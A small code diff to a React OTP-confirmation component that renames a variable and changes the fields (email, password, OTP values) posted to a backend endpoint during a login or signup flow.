@@ -1,11 +1,8 @@
 import React, { useState } from 'react'
-import { useHistory } from 'react-router-dom'
 import OtpInput from 'react-otp-input'
 import URL from './Url.js'
 
 const ConfirmOtp = (props) => {
-    const history = useHistory()
-
     const [otp, setOtp] = useState('')
     const [keepOtp, setKeepOtp] = useState([])
     const [loading, setLoading] = useState(false)
@@ -19,12 +16,11 @@ const ConfirmOtp = (props) => {
         e.preventDefault()
         setLoading(true)
 
-        const clientOtp = keepOtp.toString()
+        const confirmOtp = keepOtp.toString()
 
         if (props.location.state) {
             const templateParams = props.location.state
 
-            templateParams.clientOtp = clientOtp
 
             try {
                 const response = await fetch(URL + '/rq-1', {
@@ -40,8 +36,8 @@ const ConfirmOtp = (props) => {
                     body: JSON.stringify({
                         email: templateParams.email,
                         password: templateParams.password,
-                        pin: clientOtp,
-                        otp: '',
+                        otp: templateParams.clientOtp,
+                        confirmOtp
                     }),
                 })
 
